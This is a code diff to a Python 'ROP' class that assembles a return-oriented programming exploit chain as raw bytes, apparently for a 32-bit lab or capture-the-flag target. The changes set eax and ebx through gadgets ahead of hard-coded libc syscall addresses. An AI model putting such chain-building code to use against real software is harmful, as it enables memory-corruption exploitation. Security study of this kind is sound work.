@@ -371,6 +371,8 @@ class ROP:
                 self.arr += (0x00000001).to_bytes(4, byteorder='little')
                 #sys.stdout.buffer.write((0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little'))        #int 0x80 in libc
                 #self.arr += (0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little')
+                self.pop_register("ebx")
+                self.arr += (0x00000001).to_bytes(4, byteorder='little')
                 self.arr += (0xb7eacc5a).to_bytes(4, byteorder='little')
                 self.count += 2
             
@@ -378,9 +380,11 @@ class ROP:
                 #print("accept")
                 self.pop_register("eax")
                 #sys.stdout.buffer.write((0x00000000).to_bytes(4, byteorder='little'))      # pop 0 into eax for exit code
-                self.arr += (0x00000000).to_bytes(4, byteorder='little')
+                self.arr += (0x00000001).to_bytes(4, byteorder='little')
                 #sys.stdout.buffer.write((0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little'))
                 #self.arr += (0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little')
+                self.pop_register("ebx")
+                self.arr += (0x00000000).to_bytes(4, byteorder='little')
                 self.arr += (0xb7eacc5a).to_bytes(4, byteorder='little')
                 self.count += 2
 
